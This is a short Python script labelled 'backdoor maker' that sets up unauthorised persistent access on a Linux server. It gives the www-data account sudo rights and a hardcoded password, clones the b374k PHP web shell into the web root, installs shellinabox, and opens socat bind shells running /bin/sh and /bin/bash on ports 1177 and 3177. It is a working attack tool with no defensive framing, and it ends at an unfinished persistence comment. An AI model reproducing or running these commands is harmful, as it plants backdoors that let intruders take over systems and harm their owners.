#backdoor maker
import os
#dodatupdate
os.system("apt-get update")

#install an apache instance
apacheTrue = os.path.isfile("/etc/ssh/sshd_config")

if apacheTrue is True:
    print "Softening Apache (Giving tools:shellinabox and phpwebshell) "
    os.system("apt-get install sudo git php5 php5-cli -y")
    os.system("useradd www-data")
    os.system("adduser www-data sudo")
    os.system('echo www-data:Lolsecure2018! | chpasswd')
    os.system("git clone https://github.com/b374k/b374k /var/www/html/shell")

else:
    print "Installing Apache backdoor (Giving tools:shellinabox and phpwebshell) "
    os.system("apt-get install apache2 sudo git php5 php5-cli -y")
    os.system("useradd www-data")
    os.system("adduser www-data sudo")
    os.system('echo www-data:Lolsecure2018! | chpasswd')
    os.system("git clone https://github.com/b374k/b374k /var/www/html/shell")


#install Shell in a shellinabox
#access http://IP:4200
os.system("apt-get install shellinabox")

#Socat SCTP backdoor
#connect with socat STDIO SCTP:IP:1177
os.system("apt-get install socat")
os.system("socat SCTP-Listen:1177,fork EXEC:/bin/sh &")

#Socat Tcp backdoor
#connect with socat STDIO TCP4:IP:3177
os.system("socat TCP4-Listen:3177,fork EXEC:/bin/bash &")

#socat backdoor persistance
